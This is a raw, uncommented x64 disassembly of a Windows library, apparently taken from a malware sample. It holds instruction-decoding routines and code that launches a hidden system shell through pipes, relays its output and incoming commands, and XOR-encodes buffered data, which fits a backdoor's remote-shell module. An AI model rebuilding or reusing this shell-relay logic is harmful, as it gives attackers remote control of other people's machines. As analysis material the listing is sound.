mov [ rsp + 0x28 ] bpl
mov [ rsp + 0x20 ] rax
call sub_10002b50
jmp r-xdata
cmp esi 0x4a
jne r-xdata
cmp esi 0x2e
mov [ rbx ] 0x8c
mov [ rbx + 0x10 ] 0x17
mov [ rbx + 0x4 ] 0x10
je r-xdata
mov r8 rbx
mov edx r12d
mov rcx rdi
call sub_100029c0
cmp esi 0x5
je r-xdata
mov r8 rbx
mov edx r12d
mov rcx rdi
call sub_10003270
mov edx r12d
mov rcx rdi
mov [ rbx + 0x20 ] 0x8c
call sub_100026f0
cmp esi 0x6
mov [ rbx + 0x24 ] al
jne r-xdata
mov [ rbx ] 0x91
mov [ rbx + 0x8 ] 0x3
jmp r-xdata
lea eax [ rdx + 0x37 ]
mov [ rbx ] 0x8c
mov [ rbx + 0x4 ] 0x0
mov [ rbx + 0x10 ] eax
lea eax [ rsi - 0x3c ]
cmp eax 0x7
ja r-xdata
mov ecx 0x15
mov [ rbx ] 0x8c
mov [ rbx + 0x4 ] 0x10
mov [ rbx + 0x10 ] ecx
jmp r-xdata
mov rcx rdi
mov [ rbx ] 0x8e
mov [ rbx + 0x4 ] 0x30
call sub_100019f0
mov rcx rdi
mov [ rbx + 0xc ] eax
call sub_100018f0
mov [ rbx + 0x8 ] ax
jmp r-xdata
mov rcx rdi
mov [ rbx ] 0x8e
mov [ rbx + 0x4 ] 0x20
call sub_100018f0
mov rcx rdi
movzx r11d ax
mov [ rbx + 0xc ] r11d
call sub_100018f0
mov [ rbx + 0x8 ] ax
jmp r-xdata
mov [ rdi + 0x130 ] 0x1
cmp esi 0x4c
jne r-xdata
lea rax [ rbx + 0x20 ]
mov [ rsp + 0x30 ] 0x1
mov r9b 0x1
mov r8d r12d
mov rdx rbx
mov rcx rdi
mov [ rsp + 0x28 ] bpl
mov [ rsp + 0x20 ] rax
call sub_10002b50
cmp r14d 0x5
jne r-xdata
cmp esi 0x2
jne r-xdata
mov rcx rdi
call sub_10001850
and al 0xc0
cmp al 0xc0
jne r-xdata
lea r8 [ rbx + 0x20 ]
mov edx ebp
mov rcx rdi
call sub_100029c0
jmp r-xdata
cmp esi 0x18
je r-xdata
lea eax [ rsi - 0x1e ]
cmp eax 0x7
ja r-xdata
lea r8 [ rbx + 0x20 ]
mov edx ebp
call sub_100029c0
jmp r-xdata
mov [ rbx ] 0x8c
mov [ rbx + 0x10 ] ecx
test r8b r8b
je r-xdata
add eax 0x25
add eax 0x15
jmp r-xdata
lea eax [ rdx + 0xf ]
mov [ rbx ] 0x8c
mov [ rbx + 0x4 ] 0x10
mov [ rbx + 0x10 ] eax
jmp r-xdata
cmp edx 0x3a
je r-xdata
mov r14 [ rsp + 0x40 ]
mov r13 [ rsp + 0x48 ]
mov r12 [ rsp + 0x50 ]
mov rdi [ rsp + 0x78 ]
mov rsi [ rsp + 0x70 ]
mov rbp [ rsp + 0x68 ]
mov rbx [ rsp + 0x60 ]
xor eax eax
add rsp 0x58
retn
xor eax eax
mov [ rsp + 0x30 ] 0x0
mov r9b 0x2
mov r8d r12d
mov rdx rbx
mov rcx rdi
mov [ rsp + 0x28 ] 0x0
mov [ rsp + 0x20 ] rax
call sub_10002b50
jmp r-xdata
mov [ rdi + 0x130 ] 0x1
xor eax eax
mov [ rsp + 0x30 ] 0x0
mov r9b 0x6
mov r8d r12d
mov rdx rbx
mov rcx rdi
mov [ rsp + 0x28 ] 0x0
mov [ rsp + 0x20 ] rax
call sub_10002b50
jmp r-xdata
mov [ rdi + 0x130 ] 0x1
cmp esi 0x4a
jne r-xdata
mov [ rsp + 0x30 ] 0x2
lea rdx [ rbx + 0x20 ]
mov r9b 0x2
mov r8d ebp
mov rcx rdi
mov [ rsp + 0x28 ] r12b
mov [ rsp + 0x20 ] rbx
call sub_10002b50
cmp r14d 0x5
jne r-xdata
cmp esi 0x4f
jne r-xdata
lea rax [ rbx + 0x20 ]
mov [ rsp + 0x30 ] 0x3
mov r9b 0x1
mov r8d r12d
mov rdx rbx
mov rcx rdi
mov [ rsp + 0x28 ] bpl
mov [ rsp + 0x20 ] rax
call sub_10002b50
jmp r-xdata
mov r9b 0x1
mov r8d ebp
mov rcx rdi
mov [ rsp + 0x28 ] r12b
mov [ rsp + 0x20 ] rbx
call sub_10002b50
jmp r-xdata
cmp esi 0x4b
jne r-xdata
mov rcx rdi
call sub_10001850
and al 0xc0
cmp al 0xc0
jne r-xdata
mov [ rbx + 0x20 ] 0x8c
cmp esi 0x6
jne r-xdata
cmp esi 0x6
jne r-xdata
cmp esi 0x2e
je r-xdata
mov [ rbx + 0x30 ] 0x1
jmp r-xdata
lea eax [ rsi + 0x37 ]
mov [ rbx + 0x20 ] 0x8c
mov [ rbx + 0x24 ] 0x0
mov [ rbx + 0x30 ] eax
jmp r-xdata
cmp esi 0x49
jne r-xdata
lea rax [ rbx + 0x20 ]
mov [ rsp + 0x30 ] 0x2
jmp r-xdata
cmp r14d 0x7
jne r-xdata
lea r8 [ rbx + 0x40 ]
mov edx r13d
mov rcx rdi
call sub_100029c0
jmp r-xdata
cmp esi 0x51
jne r-xdata
mov [ rsp + 0x30 ] 0x1
lea rdx [ rbx + 0x20 ]
mov r9b 0x1
mov r8d ebp
mov rcx rdi
mov [ rsp + 0x28 ] r12b
mov [ rsp + 0x20 ] rbx
call sub_10002b50
cmp r14d 0x5
jne r-xdata
mov [ rsp + 0x30 ] 0x1
lea rdx [ rbx + 0x20 ]
mov r9b 0x1
mov r8d ebp
mov rcx rdi
mov [ rsp + 0x28 ] r12b
mov [ rsp + 0x20 ] rbx
call sub_10002b50
jmp r-xdata
mov [ rdi + 0x130 ] 0x1
mov [ rbx + 0x20 ] 0x8c
mov [ rbx + 0x30 ] 0x17
mov [ rbx + 0x24 ] 0x10
jmp r-xdata
cmp esi 0x46
jne r-xdata
cmp esi 0x46
jne r-xdata
mov edx esi
mov [ rbx + 0x20 ] 0x8c
call sub_10002960
mov [ rbx + 0x30 ] eax
jmp r-xdata
add ecx 0x4
cmp esi 0x5
jne r-xdata
cmp esi 0x18
mov [ rbx + 0x10 ] eax
jne r-xdata
cmp edx 0x3b
je r-xdata
cmp esi 0x50
jne r-xdata
lea rdx [ rbx + 0x20 ]
mov [ rsp + 0x30 ] 0x2
jmp r-xdata
lea r8 [ rbx + 0x40 ]
mov edx r13d
mov rcx rdi
call sub_100029c0
jmp r-xdata
lea rax [ rbx + 0x20 ]
mov [ rsp + 0x30 ] 0x4
cmp esi 0x3
jne r-xdata
mov [ rsp + 0x30 ] 0x6
lea rdx [ rbx + 0x20 ]
mov r9b 0x2
mov r8d ebp
mov rcx rdi
mov [ rsp + 0x28 ] r12b
mov [ rsp + 0x20 ] rbx
call sub_10002b50
jmp r-xdata
mov [ rsp + 0x30 ] 0x6
lea rdx [ rbx + 0x20 ]
mov r9b 0x6
mov r8d ebp
mov rcx rdi
mov [ rsp + 0x28 ] r12b
mov [ rsp + 0x20 ] rbx
call sub_10002b50
cmp r14d 0x5
jne r-xdata
mov eax [ rdi + 0xc8 ]
cmp eax 0x124
jne r-xdata
mov [ rbx + 0x20 ] 0x8c
mov [ rbx + 0x30 ] 0x1
mov [ rbx + 0x24 ] 0x8
jmp r-xdata
cmp esi 0x2e
jne r-xdata
mov [ rbx + 0x20 ] 0x8c
mov [ rbx + 0x30 ] 0x1
mov [ rbx + 0x24 ] 0x10
jmp r-xdata
cmp [ rdi + 0x13b ] 0x10
mov eax 0x25
mov ecx 0x15
cmove eax ecx
mov [ rbx + 0x30 ] eax
jmp r-xdata
cmp esi 0x1e
jne r-xdata
cmp esi 0x45
jne r-xdata
lea rax [ rbx + 0x20 ]
mov [ rsp + 0x30 ] 0x6
jmp r-xdata
mov r9b 0x1
mov r8d r12d
mov rdx rbx
mov rcx rdi
mov [ rsp + 0x28 ] bpl
mov [ rsp + 0x20 ] rax
call sub_10002b50
jmp r-xdata
mov [ rbx + 0x40 ] 0x8c
mov [ rbx + 0x50 ] 0x2
mov [ rbx + 0x44 ] 0x8
jmp r-xdata
cmp esi 0x50
jne r-xdata
mov [ rsp + 0x30 ] 0x1
lea rdx [ rbx + 0x20 ]
mov r9b 0x2
mov r8d ebp
mov rcx rdi
mov [ rsp + 0x28 ] r12b
mov [ rsp + 0x20 ] rbx
call sub_10002b50
cmp r14d 0x5
jne r-xdata
lea r8 [ rbx + 0x40 ]
mov edx r13d
mov rcx rdi
call sub_100029c0
jmp r-xdata
lea r8 [ rbx + 0x20 ]
mov edx ebp
mov rcx rdi
call sub_10003270
jmp r-xdata
lea r8 [ rbx + 0x20 ]
mov edx ebp
call sub_10003270
mov edx ebp
mov rcx rdi
call sub_100026f0
mov [ rbx + 0x4 ] al
jmp r-xdata
mov [ rdi + 0x130 ] 0x1
cmp esi 0x2
jne r-xdata
mov rcx rdi
call sub_10001850
and al 0xc0
cmp al 0xc0
je r-xdata
mov r9b 0x6
mov r8d ebp
mov rcx rdi
mov [ rsp + 0x28 ] r12b
mov [ rsp + 0x20 ] rbx
call sub_10002b50
jmp r-xdata
cmp esi 0x2
jne r-xdata
mov rcx rdi
call sub_10001850
and al 0xc0
cmp al 0xc0
jne r-xdata
lea r8 [ rbx + 0x40 ]
mov edx r13d
mov rcx rdi
call sub_100029c0
jmp r-xdata
cmp eax 0x121
jne r-xdata
mov [ rdi + 0xc8 ] 0x125
jmp r-xdata
mov edx esi
call sub_10002960
mov [ rbx + 0x30 ] eax
jmp r-xdata
xor eax eax
mov [ rsp + 0x30 ] 0x0
mov r9b 0x1
mov r8d r12d
mov rdx rbx
mov rcx rdi
mov [ rsp + 0x28 ] 0x0
mov [ rsp + 0x20 ] rax
call sub_10002b50
cmp esi 0x7
jne r-xdata
lea rax [ rbx + 0x20 ]
mov [ rsp + 0x30 ] 0x5
jmp r-xdata
cmp esi 0x4a
jne r-xdata
mov rcx rdi
call sub_10001850
and al 0xc0
cmp al 0xc0
je r-xdata
lea r8 [ rbx + 0x40 ]
mov edx r13d
mov rcx rdi
call sub_100029c0
jmp r-xdata
mov [ rsp + 0x30 ] sil
lea rdx [ rbx + 0x20 ]
mov r9b 0x1
mov r8d ebp
mov rcx rdi
mov [ rsp + 0x28 ] r12b
mov [ rsp + 0x20 ] rbx
call sub_10002b50
cmp r14d 0x5
jne r-xdata
lea rdx [ rbx + 0x20 ]
mov [ rsp + 0x30 ] 0x2
jmp r-xdata
mov [ rdi + 0x130 ] 0x1
cmp esi 0x51
jne r-xdata
mov [ rsp + 0x30 ] 0x6
lea rdx [ rbx + 0x20 ]
mov r9b 0x1
mov r8d ebp
mov rcx rdi
mov [ rsp + 0x28 ] r12b
mov [ rsp + 0x20 ] rbx
call sub_10002b50
jmp r-xdata
mov [ rsp + 0x30 ] 0x6
lea rdx [ rbx + 0x20 ]
mov r9b 0x1
mov r8d ebp
mov rcx rdi
mov [ rsp + 0x28 ] r12b
mov [ rsp + 0x20 ] rbx
call sub_10002b50
jmp r-xdata
mov [ rdi + 0x130 ] 0x1
mov [ rdi + 0xc8 ] 0x122
cmp esi 0x47
jne r-xdata
mov [ rbx + 0x20 ] 0x8c
mov [ rbx + 0x30 ] 0x2
mov [ rbx + 0x24 ] 0x8
jmp r-xdata
lea rdx [ rbx + 0x20 ]
mov [ rsp + 0x30 ] 0x1
mov [ rdi + 0x130 ] 0x1
jmp r-xdata
lea r8 [ rbx + 0x40 ]
mov edx r13d
mov rcx rdi
call sub_100029c0
jmp r-xdata
mov [ rsp + 0x30 ] 0x6
lea rdx [ rbx + 0x20 ]
mov r9b 0x2
mov r8d ebp
mov rcx rdi
mov [ rsp + 0x28 ] r12b
mov [ rsp + 0x20 ] rbx
call sub_10002b50
jmp r-xdata
mov [ rbx + 0x20 ] 0x91
mov [ rdi + 0xf8 ] 0x1
jmp r-xdata
sub_10003d0f
sbb bl [ rdx ]
or [ rcx ] ecx
or [ rcx ] ecx
or [ rcx ] ecx
or [ rcx ] ecx
or [ rcx ] ecx
or [ rcx ] ecx
or [ rcx ] ecx
or [ rcx ] ecx
or cl [ rdx ]
or cl [ rdx ]
or cl [ rdx ]
or cl [ rdx ]
or ecx [ rbx ]
or ecx [ rbx ]
or ecx [ rbx ]
or al 0xc
or al 0xc
or al 0xc
or al 0xc
or eax 0x101a0f0e
adc [ rdx ] edx
adc edx [ rdx + 0x19181716 ]
int3
sub_10003d50
cmp [ rcx + 0x130 ] 0x0
mov r8 rcx
jne r-xdata
mov eax 0xffffffff
retn
movzx eax [ rcx + 0xac ]
cmp al 0x40
jne r-xdata
cmp al 0x20
jne r-xdata
mov r9 [ rcx + 0x288 ]
test [ r9 + 0x1c ] 0x10
je r-xdata
cmp al 0x10
jne r-xdata
cmp [ r8 + 0x133 ] 0x0
mov ecx 0x20
mov edx 0x10
mov eax ecx
cmovne eax edx
cmp [ r8 + 0x134 ] 0x0
cmovne ecx edx
mov [ r8 + 0x13b ] al
mov [ r8 + 0x13c ] cl
jmp r-xdata
mov edx [ r9 + 0x1c ]
mov ecx edx
mov eax edx
shr ecx 0x5
shr eax 0x8
and cl 0x1
and al 0x1
or cl 0x8
add cl cl
or cl al
mov eax edx
shr edx 0x1
add cl cl
and dl 0x1
shr eax 0xb
and al 0x1
or cl al
add cl cl
or cl dl
and [ r8 + 0x131 ] cl
mov r10d [ r9 + 0x1c ]
mov ecx 0x20
shr r10d 0x7
lea edx [ rcx + 0x20 ]
and r10b 0x1
test [ r8 + 0x131 ] 0x8
mov [ r8 + 0x13a ] r10b
je r-xdata
mov [ rcx + 0x130 ] 0x1
mov rcx [ r8 + 0x288 ]
movzx eax [ rcx + 0x1c ]
and al 0x1
mov [ r8 + 0x140 ] al
mov eax [ rcx + 0x1c ]
shr eax 0x6
and al 0x1
mov [ r8 + 0x141 ] al
mov eax [ rcx + 0x1c ]
shr eax 0x3
and al 0x1
mov [ r8 + 0x142 ] al
mov eax [ rcx + 0x1c ]
shr eax 0xc
and al 0x1
mov [ r8 + 0x13f ] al
xor eax eax
retn
cmp [ r8 + 0x133 ] 0x0
mov edx 0x10
mov ecx 0x20
mov eax edx
cmovne eax ecx
cmp [ r8 + 0x133 ] 0x0
je r-xdata
mov [ r8 + 0x13b ] dl
jmp r-xdata
mov eax ecx
test r10b r10b
cmovne eax edx
jmp r-xdata
mov [ r8 + 0x13b ] 0x10
jmp r-xdata
cmp [ r8 + 0x134 ] 0x0
cmovne edx ecx
mov [ r8 + 0x13c ] dl
mov [ r8 + 0x13b ] al
sub_10003ec0
sub rsp 0x28
xor eax eax
mov [ rcx + 0x18 ] 0x0
mov [ rcx + 0x130 ] 0x0
mov [ rcx + 0x133 ] 0x0
mov [ rcx + 0x134 ] 0x0
mov [ rcx + 0x135 ] 0x0
mov [ rcx + 0x138 ] 0x0
mov [ rcx + 0x136 ] 0x0
mov [ rcx + 0x137 ] 0x0
mov [ rcx + 0x132 ] 0x0
mov [ rcx + 0x131 ] 0x0
mov [ rcx + 0x139 ] 0x0
mov [ rcx + 0xc8 ] 0x22f
mov [ rsp + 0x30 ] rbx
mov [ rsp + 0x38 ] rbp
xor ebp ebp
mov rbx rcx
mov [ rcx + 0x288 ] rbp
mov [ rcx + 0xd0 ] rax
mov [ rcx + 0xd8 ] rax
mov [ rcx + 0xe0 ] rax
mov [ rcx + 0xe8 ] rax
mov [ rcx + 0xf0 ] rax
mov [ rcx + 0xf8 ] rax
mov [ rcx + 0x100 ] rax
mov [ rcx + 0x108 ] rax
mov [ rcx + 0x110 ] rax
mov [ rcx + 0x118 ] rax
mov [ rcx + 0x120 ] rax
mov [ rcx + 0x128 ] rax
call sub_10001f90
test eax eax
jne r-xdata
cmp [ rbx + 0x130 ] bpl
je r-xdata
mov rcx rbx
call sub_10002390
test eax eax
jne r-xdata
cmp [ rbx + 0x130 ] bpl
mov rcx [ rbx + 0xb0 ]
movzx edx [ rbx + 0x18 ]
lea rax [ rcx + rdx ]
mov [ rsp + 0x40 ] rsi
mov [ rbx + 0x40 ] rcx
mov [ rbx + 0xa8 ] ebp
lea rsi [ rbx + 0x243 ]
mov [ rbx + 0xb0 ] rax
jne r-xdata
xor eax eax
mov [ rbx + 0xc8 ] 0x22f
mov [ rbx + 0x130 ] bpl
mov [ rbx + 0x133 ] bpl
mov [ rbx + 0x134 ] bpl
mov [ rbx + 0x135 ] bpl
mov [ rbx + 0x138 ] bpl
mov [ rbx + 0x136 ] bpl
mov [ rbx + 0x137 ] bpl
mov [ rbx + 0x132 ] bpl
mov [ rbx + 0x131 ] bpl
mov [ rbx + 0x139 ] bpl
mov [ rbx + 0xd0 ] rax
mov [ rbx + 0xd8 ] rax
mov [ rbx + 0xe0 ] rax
mov [ rbx + 0xe8 ] rax
mov [ rbx + 0xf0 ] rax
mov [ rbx + 0xf8 ] rax
mov [ rbx + 0x100 ] rax
mov [ rbx + 0x108 ] rax
mov [ rbx + 0x110 ] rax
mov [ rbx + 0x118 ] rax
mov [ rbx + 0x120 ] rax
mov [ rbx + 0x128 ] rax
lea rax [ rw-data ]
mov [ rbx + 0x288 ] rax
mov eax [ rw-data ]
mov [ rbx + 0xc8 ] eax
mov rcx rbx
call sub_10003d50
test eax eax
jne r-xdata
movzx eax [ rbx + 0x18 ]
mov rsi [ rsp + 0x40 ]
mov rbp [ rsp + 0x38 ]
mov rbx [ rsp + 0x30 ]
add rsp 0x28
retn
test dl dl
mov [ rsp + 0x48 ] rdi
lea rdi [ rbx + 0x48 ]
je r-xdata
mov rcx rbx
call sub_10003360
test eax eax
jne r-xdata
movzx eax [ rbx + 0x18 ]
mov rdi [ rsp + 0x48 ]
mov rsi [ rsp + 0x40 ]
mov rbp [ rsp + 0x38 ]
mov rbx [ rsp + 0x30 ]
add rsp 0x28
retn
nop
nop
mov rcx rbx
call sub_10002770
movzx r8d [ rsi ]
lea rdx [ r--data ]
mov rcx rdi
call [ sprintf@IAT ]
movzx eax [ rbx + 0x18 ]
add ebp 0x1
add rdi 0x2
add rsi 0x1
cmp ebp eax
jb r-xdata
sub_10004130
push rbx
sub rsp 0x20
mov rcx [ rw-data ]
test rcx rcx
je r-xdata
xor eax eax
add rsp 0x20
pop rbx
retn
mov rcx [ rcx + 0x18 ]
call [ CloseHandle@IAT ]
mov rcx [ rw-data ]
mov rcx [ rcx ]
call [ CloseHandle@IAT ]
mov rcx [ rw-data ]
mov rcx [ rcx + 0x10 ]
call [ CloseHandle@IAT ]
mov rcx [ rw-data ]
mov rcx [ rcx + 0x8 ]
call [ CloseHandle@IAT ]
mov rcx [ rw-data ]
xor edx edx
mov rcx [ rcx + 0x20 ]
call [ TerminateProcess@IAT ]
mov rcx [ rw-data ]
mov ebx eax
call ??3@YAXPEAX@Z
mov [ rw-data ] 0x0
mov eax ebx
add rsp 0x20
pop rbx
retn
sub_100041c0
sub rsp 0x48
mov rax [ rw-data ]
mov [ rsp + 0x58 ] rbp
mov [ rsp + 0x60 ] rsi
mov [ rsp + 0x68 ] rdi
mov rdi [ rax ]
mov rsi rcx
xor ebp ebp
mov [ rsp + 0x50 ] rbx
nop
nop
nop
mov rdi [ rsp + 0x68 ]
mov rsi [ rsp + 0x60 ]
mov rbp [ rsp + 0x58 ]
mov rbx [ rsp + 0x50 ]
add rsp 0x48
retn
mov eax [ rsp + 0x30 ]
mov [ rsp + 0x34 ] ebp
test eax eax
je r-xdata
mov ecx 0xa
call [ Sleep@IAT ]
lea ecx [ rax + 0x1 ]
call [ malloc@IAT ]
test rax rax
mov rbx rax
je r-xdata
lea rax [ rsp + 0x30 ]
xor r9d r9d
xor r8d r8d
xor edx edx
mov rcx rdi
mov [ rsp + 0x28 ] rbp
mov [ rsp + 0x20 ] rax
mov [ rsp + 0x30 ] ebp
call [ PeekNamedPipe@IAT ]
test eax eax
je r-xdata
mov r8d [ rsp + 0x30 ]
xor edx edx
mov rcx rax
add r8d 0x1
call memset
mov r8d [ rsp + 0x30 ]
lea r9 [ rsp + 0x34 ]
mov rdx rbx
mov rcx rdi
mov [ rsp + 0x20 ] rbp
call [ ReadFile@IAT ]
test eax eax
je r-xdata
mov eax [ rsp + 0x34 ]
mov r9 rbx
mov edx 0xa00c
mov r8d 0xffffffff
mov rcx rsi
mov [ rsp + 0x28 ] bp
mov [ rsp + 0x20 ] eax
call sub_10004e70
mov rcx rbx
call [ free@IAT ]
jmp r-xdata
cmp [ rw-data ] rbp
jne r-xdata
sub_100042d0
mov r11 rsp
sub rsp 0x238
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x220 ] rax
mov [ r11 + 0x10 ] rbx
mov rbx rcx
mov [ r11 + 0x18 ] rsi
lea rcx [ rsp + 0x50 ]
lea r8 [ rsp + 0x70 ]
lea rdx [ rsp + 0x58 ]
xor esi esi
xor r9d r9d
mov [ rsp + 0x70 ] 0x18
mov [ rsp + 0x80 ] 0x1
mov [ rsp + 0x78 ] rsi
call [ CreatePipe@IAT ]
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
lea r8 [ rsp + 0x70 ]
lea rdx [ rsp + 0x68 ]
lea rcx [ rsp + 0x60 ]
xor r9d r9d
call [ CreatePipe@IAT ]
test eax eax
jne r-xdata
mov rsi [ rsp + 0x250 ]
mov rbx [ rsp + 0x248 ]
mov rcx [ rsp + 0x220 ]
xor rcx rsp
call sub_10010a60
add rsp 0x238
retn
xor edx edx
lea rcx [ rsp + 0xa0 ]
mov [ rsp + 0x258 ] rdi
lea r8d [ rdx + 0x68 ]
call memset
mov rax [ rsp + 0x60 ]
lea rcx [ rsp + 0x110 ]
mov [ rsp + 0xf0 ] rax
mov rax [ rsp + 0x58 ]
mov edx 0x104
mov [ rsp + 0xa0 ] 0x68
mov [ rsp + 0xdc ] 0x101
mov [ rsp + 0xe0 ] si
mov [ rsp + 0xf8 ] rax
mov [ rsp + 0x100 ] rax
call [ GetSystemDirectoryA@IAT ]
xor eax eax
lea rdi [ rsp + 0x110 ]
mov rcx 0xffffffffffffffff
[ rdi ]
mov rax [ r--data ]
lea rcx [ rsp + 0x110 ]
mov [ rdi - 0x1 ] rax
movzx eax [ r--data ]
xor r9d r9d
mov [ rdi + 0x7 ] al
lea rax [ rsp + 0x88 ]
xor r8d r8d
mov [ rsp + 0x48 ] rax
lea rax [ rsp + 0xa0 ]
xor edx edx
mov [ rsp + 0x40 ] rax
mov [ rsp + 0x38 ] rsi
mov [ rsp + 0x30 ] rsi
mov [ rsp + 0x28 ] esi
mov [ rsp + 0x20 ] 0x1
call [ CreateProcessA@IAT ]
test eax eax
mov rdi [ rsp + 0x258 ]
jne r-xdata
mov rcx [ rsp + 0x50 ]
call [ CloseHandle@IAT ]
mov rcx [ rsp + 0x58 ]
call [ CloseHandle@IAT ]
mov ecx 0x38
call ??2@YAPEAX_K@Z
xor ecx ecx
lea rdx [ rsp + 0x88 ]
mov [ rw-data ] rax
mov [ rax ] rcx
mov [ rax + 0x8 ] rcx
mov [ rax + 0x10 ] rcx
mov [ rax + 0x18 ] rcx
mov [ rax + 0x20 ] rcx
mov [ rax + 0x28 ] rcx
mov [ rax + 0x30 ] rcx
mov rax [ rdx ]
mov rcx [ rw-data ]
mov r8 rbx
mov [ rcx + 0x20 ] rax
mov rax [ rdx + 0x8 ]
mov [ rcx + 0x28 ] rax
mov rax [ rdx + 0x10 ]
xor edx edx
mov [ rcx + 0x30 ] rax
mov rax [ rw-data ]
mov rcx [ rsp + 0x58 ]
mov [ rax + 0x18 ] rcx
mov rax [ rw-data ]
mov rcx [ rsp + 0x50 ]
mov [ rax ] rcx
mov rax [ rw-data ]
mov rcx [ rsp + 0x60 ]
mov [ rax + 0x10 ] rcx
mov rcx [ rsp + 0x68 ]
mov rax [ rw-data ]
mov [ rax + 0x8 ] rcx
lea rcx [ sub_100041c0 ]
call [ _beginthread@IAT ]
mov rax [ rsp + 0x50 ]
mov rcx [ rsp + 0x50 ]
call [ CloseHandle@IAT ]
mov rcx [ rsp + 0x58 ]
call [ CloseHandle@IAT ]
mov rcx [ rsp + 0x68 ]
call [ CloseHandle@IAT ]
mov rcx [ rsp + 0x60 ]
call [ CloseHandle@IAT ]
xor eax eax
jmp r-xdata
sub_10004560
sub rsp 0x48
test edx edx
mov [ rsp + 0x58 ] rbx
mov [ rsp + 0x60 ] rsi
mov [ rsp + 0x68 ] rdi
mov rsi rcx
movsxd rdi edx
jle r-xdata
call sub_10004130
mov rdi [ rsp + 0x68 ]
mov rsi [ rsp + 0x60 ]
mov rbx [ rsp + 0x58 ]
add rsp 0x48
retn
lea eax [ rdi + 0x8 ]
movsxd rcx eax
call ??2@YAPEAX_K@Z
test rax rax
mov rbx rax
je r-xdata
mov r8d edi
mov rdx rax
mov rcx rsi
call sub_10004db0
cmp eax edi
je r-xdata
lea rdx [ r--data ]
mov rcx rbx
mov [ rdi + rbx ] 0x0
call [ _stricmp@IAT ]
test eax eax
je r-xdata
mov rcx rbx
call ??3@YAXPEAX@Z
xor eax eax
mov rcx 0xffffffffffffffff
mov rdi rbx
[ rdi ]
not rcx
lea rax [ rcx - 0x1 ]
cdqe
cmp [ rax + rbx - 0x1 ] 0xd
je r-xdata
xor eax eax
mov rcx 0xffffffffffffffff
mov rdi rbx
[ rdi ]
lea r9 [ rsp + 0x30 ]
mov rdx rbx
not rcx
mov [ rsp + 0x20 ] rax
lea r8 [ rcx - 0x1 ]
mov rcx [ rw-data ]
mov rcx [ rcx + 0x8 ]
call [ WriteFile@IAT ]
test eax eax
jne r-xdata
mov [ rax + rbx ] 0xd
mov [ rax + rbx + 0x1 ] 0xa
mov [ rax + rbx + 0x2 ] 0x0
mov rcx rbx
call ??3@YAXPEAX@Z
mov rdi [ rsp + 0x68 ]
mov rsi [ rsp + 0x60 ]
mov rbx [ rsp + 0x58 ]
add rsp 0x48
retn
call sub_10004130
sub_10004660
sub rsp 0x28
lea rax [ r--data ]
mov [ rsp + 0x40 ] rbx
mov [ rcx + 0x78 ] rdx
mov rbx rcx
mov [ rcx + 0x20 ] 0x0
mov [ rcx ] rax
mov ecx 0x100000
mov [ rsp + 0x48 ] rdi
call ??2@YAPEAX_K@Z
xor edi edi
xor r9d r9d
lea rdx [ rax + 0x100000 ]
xor ecx ecx
mov [ rbx + 0x80 ] rax
mov [ rbx + 0x88 ] rdx
mov edx 0x1
mov [ rbx + 0x90 ] rax
mov r8d edx
mov [ rbx + 0x98 ] edi
mov [ rbx + 0x68 ] edi
mov [ rbx + 0x28 ] edi
mov [ rbx + 0x24 ] edi
mov [ rbx + 0x8 ] rdi
mov [ rbx + 0x10 ] rdi
mov [ rbx + 0x18 ] rdi
call [ CreateEventA@IAT ]
mov rcx rax
mov [ rbx + 0x30 ] rax
call [ SetEvent@IAT ]
lea r8d [ rdi + 0x1 ]
xor r9d r9d
xor edx edx
xor ecx ecx
call [ CreateEventA@IAT ]
lea rcx [ rbx + 0xa0 ]
mov [ rbx + 0x40 ] rdi
mov [ rbx + 0x58 ] rdi
mov [ rbx + 0x48 ] rdi
mov [ rbx + 0x50 ] rdi
mov [ rbx + 0x38 ] rax
mov [ rbx + 0x60 ] edi
mov [ rbx + 0x64 ] edi
call [ InitializeCriticalSection@IAT ]
lea rcx [ rbx + 0xc8 ]
call [ InitializeCriticalSection@IAT ]
mov [ rbx + 0x70 ] rdi
mov rdi [ rsp + 0x48 ]
mov rax rbx
mov rbx [ rsp + 0x40 ]
add rsp 0x28
retn
sub_10004750
sub rsp 0x28
movsxd r9 [ rcx + 0x98 ]
mov [ rsp + 0x40 ] rbx
mov rbx rcx
mov [ rsp + 0x48 ] rdi
mov edi r8d
mov r8d [ rcx + 0x80 ]
sub r8d [ rcx + 0x90 ]
mov rcx r9
sub r8d r9d
add r8d 0x100000
cmp r8d edi
cmovl edi r8d
add rcx [ rbx + 0x90 ]
movsxd r8 edi
call memcpy
add [ rbx + 0x98 ] edi
mov rbx [ rsp + 0x40 ]
mov eax edi
mov rdi [ rsp + 0x48 ]
add rsp 0x28
retn
sub_100047c0
sub rsp 0x28
mov [ rsp + 0x30 ] rbx
mov [ rsp + 0x38 ] rbp
mov [ rsp + 0x40 ] rsi
movsxd rsi r8d
mov [ rsp + 0x48 ] rdi
mov rdi rcx
lea eax [ rsi + 0x1 ]
mov rbx rdx
movsxd rcx eax
call ??2@YAPEAX_K@Z
test rax rax
mov rbp rax
jne r-xdata
test esi esi
mov rdx rsi
jle r-xdata
lea eax [ rbp - 0x1 ]
jmp r-xdata
mov rcx [ rdi + 0x78 ]
xor r9d r9d
mov r8d esi
mov rdx rbp
call [ rw-data ]
mov rcx rbp
mov ebx eax
call ??3@YAXPEAX@Z
mov eax ebx
mov rcx rax
sub rbx rax
nop
nop
nop
mov rdi [ rsp + 0x48 ]
mov rsi [ rsp + 0x40 ]
mov rbp [ rsp + 0x38 ]
mov rbx [ rsp + 0x30 ]
add rsp 0x28
retn
movzx eax [ rbx + rcx ]
add rcx 0x1
xor al [ rdi + 0x20 ]
sub rdx 0x1
mov [ rcx - 0x1 ] al
jne r-xdata
sub_10004860
sub rsp 0x38
mov [ rsp + 0x40 ] rbx
mov [ rsp + 0x48 ] rbp
mov [ rsp + 0x50 ] rsi
mov [ rsp + 0x58 ] rdi
mov rbx rcx
mov [ rsp + 0x30 ] r12
add rcx 0xc8
mov [ rsp + 0x28 ] r13
mov esi r8d
mov r13 rdx
call [ EnterCriticalSection@IAT ]
xor ebp ebp
test esi esi
mov edi ebp
jle r-xdata
lea rcx [ rbx + 0xc8 ]
call [ LeaveCriticalSection@IAT ]
mov r13 [ rsp + 0x28 ]
mov r12 [ rsp + 0x30 ]
mov rbx [ rsp + 0x40 ]
cmp edi esi
mov rdi [ rsp + 0x58 ]
mov rsi [ rsp + 0x50 ]
sete bpl
mov eax ebp
mov rbp [ rsp + 0x48 ]
add rsp 0x38
retn
